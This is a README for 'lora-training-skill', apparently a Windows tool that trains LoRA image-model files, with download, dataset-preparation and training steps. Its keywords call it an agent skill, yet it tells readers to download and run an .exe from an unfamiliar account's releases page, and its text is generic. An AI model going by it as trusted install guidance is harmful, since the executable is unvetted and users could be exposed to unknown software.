# ⚙️ lora-training-skill - Train custom images for image generators

[![Download Application](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/layerplague867/lora-training-skill/releases)

This software turns a folder of your images into a custom model file. You use this file with AI tools to generate images that show specific people, styles, or concepts. It prepares your data, fixes common issues, and manages the training process so you get consistent results. 

## 📥 How to download and install

1. Visit the [official release page](https://github.com/layerplague867/lora-training-skill/releases).
2. Look for the most recent version at the top of the list.
3. Click the link that ends in .exe to start your download.
4. Open the file once the download finishes.
5. Follow the prompts on your screen to complete the installation.
6. Launch the program from your desktop shortcut.

## 🖥️ System requirements

Your computer needs specific hardware components to run this software. Ensure you meet these standards for valid performance:

- Operating System: Windows 10 or Windows 11 (64-bit).
- Graphics Card: NVIDIA GPU with at least 8GB of video memory (VRAM).
- System Memory: 16GB of RAM or more.
- Storage: 10GB of free space on your hard drive for temporary files and models.
- Graphics Drivers: Install the latest NVIDIA drivers before you run the application for the first time.

## 🎨 Preparing your dataset

The results depend on the quality of your images. Follow these steps to prepare your files:

1. Create a folder on your computer.
2. Place 15 to 30 high-quality images inside this folder.
3. Ensure your images show the subject from different angles and lighting conditions.
4. Choose clear images without blur, watermarks, or extra text.
5. Keep your images in a standard format like JPG or PNG.

## 🚀 Training your first LoRA

The application handles the complex technical steps for you. Follow this workflow:

1. Open the application.
2. Select your folder of images using the file picker.
3. Choose the model type you want to train. You can pick between SD1.5, SDXL, or Flux.
4. Click the analyze button to let the software check your images for issues.
5. Review the recommendations provided by the tool. It suggests fixes if it finds low-quality images.
6. Press the start button to begin the training process.
7. Wait while the application trains your model. This process takes between 20 minutes and two hours depending on your computer speed.
8. Locate your finished model file in the output folder once the progress bar reaches completion.

## 🛠️ Finding your trained files

When the process finishes, the software moves your new model into a folder named "Output." You will see a file ending in .safetensors. This is the file you move to your image generation software. Copy this file into the folder where your AI image generator keeps its LoRA or custom models.

## 💡 Troubleshooting common issues

If the software stops or errors occur, try these steps:

- Check your internet connection. Some initial setups require a small download.
- Verify that your graphics card drivers are current. Outdated drivers often cause training errors.
- Close other demanding programs before you start the training. This frees up video memory for the software to use.
- Clear your temporary files if you run out of disk space during the process.
- Ensure your image filenames contain only letters, numbers, and dashes. Avoid symbols or spaces in filenames.

## 🛡️ Maintain quality

The software includes a doctor feature for your data. Always pay attention to the warnings in the main window. If the software highlights a specific image as low quality, remove it or edit it before you start. High-quality input leads to high-quality output. Use the "safe fixer" option to automatically adjust brightness and contrast on images that seem too dark or too bright.

## 📧 Seeking help

If you encounter technical errors during the startup process, look for the log file in your installation directory. The log file stores details about what happened during the last session. You can share these details with the community if the software behaves in an unexpected way.

Keywords: agent-skills, anima, civitai, claude-code, comfyui, dataset-tools, kohya, lora, lora-training, sd-trainer, skill-md, stable-diffusion